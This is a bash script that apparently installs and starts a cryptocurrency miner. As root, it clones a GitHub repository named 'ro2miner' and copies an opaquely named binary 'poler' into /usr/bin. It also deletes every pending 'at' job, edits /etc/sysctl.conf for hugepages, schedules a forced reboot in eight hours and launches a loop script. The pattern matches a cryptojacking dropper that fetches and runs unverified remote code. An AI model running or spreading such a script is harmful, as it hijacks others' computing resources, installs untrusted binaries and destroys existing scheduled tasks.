#!/bin/bash

rm -rf /tmp/next1/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano dos2unix cmake mc -y
sleep 2
cd /tmp && mkdir next1
git clone https://github.com/robbertopp1/ro2miner.git /tmp/next1
cd /tmp/next1
chmod +x /tmp/next1/poler
chmod 777 ./*.sh
cp /tmp/next1/poler /usr/bin/
sleep 3

sudo dos2unix loop.sh
sudo dos2unix zaloop.sh

touch /tmp/at.txt
chmod +x /tmp/at.txt
echo 'sudo systemctl reboot -f' >> /tmp/at.txt
sudo at now + 8 hours < /tmp/at.txt

sudo ./loop.sh
